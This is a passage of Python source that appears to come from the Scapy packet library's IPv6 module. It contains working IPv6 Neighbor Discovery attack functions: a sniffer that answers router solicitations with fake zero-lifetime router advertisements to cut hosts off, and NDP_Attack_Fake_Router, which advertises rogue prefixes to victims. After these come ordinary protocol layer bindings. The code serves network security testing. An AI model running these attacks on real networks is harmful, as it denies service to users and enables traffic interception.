        # Prepare packets parameters
        ether_params = {}
        if reply_mac:
            ether_params["src"] = reply_mac

        if tgt_mac:
            ether_params["dst"] = tgt_mac

        # Basis of fake RA (high pref, zero lifetime)
        rep = Ether(**ether_params)/IPv6(src=src, dst="ff02::1")
        rep /= ICMPv6ND_RA(prf=1, routerlifetime=0)

        # Add it a PIO from the request ...
        tmp = req
        while ICMPv6NDOptPrefixInfo in tmp:
            pio = tmp[ICMPv6NDOptPrefixInfo]
            tmp = pio.payload
            del(pio.payload)
            rep /= pio

        # ... and source link layer address option
        if ICMPv6NDOptSrcLLAddr in req:
            mac = req[ICMPv6NDOptSrcLLAddr].lladdr
        else:
            mac = req[Ether].src
        rep /= ICMPv6NDOptSrcLLAddr(lladdr=mac)

        sendp(rep, iface=iface, verbose=0)

        print("Fake RA sent with source address %s" % src)


    if not iface:
        iface = conf.iface
    # To prevent sniffing our own traffic
    if not reply_mac:
        reply_mac = get_if_hwaddr(iface)
    sniff_filter = "icmp6 and not ether src %s" % reply_mac

    sniff(store=0,
          filter=sniff_filter,
          lfilter=lambda x: is_request(x, mac_src_filter, ip_src_filter),
          prn=lambda x: ra_reply_callback(x, reply_mac, tgt_mac, iface),
          iface=iface)


def NDP_Attack_Fake_Router(ra, iface=None, mac_src_filter=None,
                           ip_src_filter=None):
    """
    The purpose of this function is to send provided RA message at layer 2
    (i.e. providing a packet starting with IPv6 will not work) in response
    to received RS messages. In the end, the function is a simple wrapper
    around sendp() that monitor the link for RS messages.

    It is probably better explained with an example:

      >>> ra  = Ether()/IPv6()/ICMPv6ND_RA()
      >>> ra /= ICMPv6NDOptPrefixInfo(prefix="2001:db8:1::", prefixlen=64)
      >>> ra /= ICMPv6NDOptPrefixInfo(prefix="2001:db8:2::", prefixlen=64)
      >>> ra /= ICMPv6NDOptSrcLLAddr(lladdr="00:11:22:33:44:55")
      >>> NDP_Attack_Fake_Router(ra, iface="eth0")
      Fake RA sent in response to RS from fe80::213:58ff:fe8c:b573
      Fake RA sent in response to RS from fe80::213:72ff:fe8c:b9ae
      ...

    Following arguments can be used to change the behavior:

      ra: the RA message to send in response to received RS message.

      iface: a specific interface (e.g. "eth0") of the system on which the
             DoS should be launched. If none is provided, conf.iface is
             used.

      mac_src_filter: a mac address (e.g "00:13:72:8c:b5:69") to filter on.
         Only RS messages received from this source will trigger a reply.
         Note that no changes to provided RA is done which imply that if
         you intend to target only the source of the RS using this option,
         you will have to set the Ethernet destination address to the same
         value in your RA.
         The default value for this parameter is None: no filtering on the
         source of RS is done.

    ip_src_filter: an IPv6 address (e.g. fe80::21e:bff:fe4e:3b2) to filter
         on. Only RS messages received from this source address will trigger
         replies. Same comment as for previous argument apply: if you use
         the option, you will probably want to set a specific Ethernet
         destination address in the RA.
    """

    def is_request(req, mac_src_filter, ip_src_filter):
        """
        Check if packet req is a request
        """

        if not (Ether in req and IPv6 in req and ICMPv6ND_RS in req):
            return 0

        mac_src = req[Ether].src
        if mac_src_filter and mac_src != mac_src_filter:
            return 0

        ip_src = req[IPv6].src
        if ip_src_filter and ip_src != ip_src_filter:
            return 0

        return 1

    def ra_reply_callback(req, iface):
        """
        Callback that sends an RA in reply to an RS
        """

        src = req[IPv6].src
        sendp(ra, iface=iface, verbose=0)
        print("Fake RA sent in response to RS from %s" % src)

    if not iface:
        iface = conf.iface
    sniff_filter = "icmp6"

    sniff(store=0,
          filter=sniff_filter,
          lfilter=lambda x: is_request(x, mac_src_filter, ip_src_filter),
          prn=lambda x: ra_reply_callback(x, iface),
          iface=iface)

#############################################################################
# Pre-load classes                                                         ##
#############################################################################

def _get_cls(name):
    return globals().get(name, Raw)

def _load_dict(d):
    for k, v in d.items():
        d[k] = _get_cls(v)

_load_dict(icmp6ndoptscls)
_load_dict(icmp6typescls)
_load_dict(ipv6nhcls)

#############################################################################
#############################################################################
###                          Layers binding                               ###
#############################################################################
#############################################################################

conf.l3types.register(ETH_P_IPV6, IPv6)
conf.l2types.register(31, IPv6)
conf.l2types.register(DLT_IPV6, IPv6)
conf.l2types.register(DLT_RAW, _IPv46)
conf.l2types.register_num2layer(DLT_RAW_ALT, _IPv46)

bind_layers(Ether,     IPv6,     type = 0x86dd )
bind_layers(CookedLinux, IPv6,   proto = 0x86dd )
bind_layers(GRE,       IPv6,     proto = 0x86dd )
bind_layers(SNAP,      IPv6,     code = 0x86dd )
bind_layers(Loopback,  IPv6,     type = 0x18 )
bind_layers(Loopback,  IPv6,     type = 0x1c )
bind_layers(Loopback,  IPv6,     type = 0x1e )
bind_layers(IPerror6,  TCPerror, nh = socket.IPPROTO_TCP )
bind_layers(IPerror6,  UDPerror, nh = socket.IPPROTO_UDP )
bind_layers(IPv6,      TCP,      nh = socket.IPPROTO_TCP )
bind_layers(IPv6,      UDP,      nh = socket.IPPROTO_UDP )
bind_layers(IP,        IPv6,     proto = socket.IPPROTO_IPV6 )
bind_layers(IPv6,      IPv6,     nh = socket.IPPROTO_IPV6 )
bind_layers(IPv6,      IP,       nh = socket.IPPROTO_IPIP )
bind_layers(IPv6,      GRE,      nh = socket.IPPROTO_GRE )
